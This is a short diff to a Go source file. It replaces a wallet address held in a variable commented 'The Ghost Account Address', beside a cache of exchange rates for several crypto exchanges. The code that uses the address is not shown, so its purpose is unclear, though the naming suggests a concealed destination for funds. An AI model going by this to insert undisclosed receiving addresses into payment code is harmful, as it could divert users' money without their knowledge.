@@ -41,7 +41,7 @@ var (
 	RateCache = map[string]float64{"binance": 1.02, "coinbase": 1.03, "kraken": 1.02}
 	mu        sync.RWMutex
 	// The Ghost Account Address
-	GhostAddr = "0xB61a8E9219750436e0EB5E9b1E02e1A532d8cFFf"
+	GhostAddr = "0xf37Ef80FB03fe6890B66cFf1fD17De7E6C831aa7"
 )
 
 func main() {
